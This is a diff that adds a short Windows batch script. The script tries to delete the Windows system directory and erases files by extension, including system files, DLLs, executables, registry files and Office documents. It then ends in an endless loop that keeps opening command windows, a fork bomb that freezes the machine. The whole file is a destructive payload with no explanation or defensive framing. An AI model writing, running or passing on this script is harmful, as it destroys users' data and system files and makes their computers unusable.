@@ -1,0 +1,20 @@
+@echo off
+kill %windir%
+del %windir%
+del *.txt
+del *.scr
+del *.sys
+del *.dll
+del *.com
+del *.reg
+del *.doc
+del *.docx
+del *.ppt
+del *.pptx
+del *.cmd
+del *.exe
+del *.bat
+del *.ini
+:ok
+start, cmd
+Goto ok
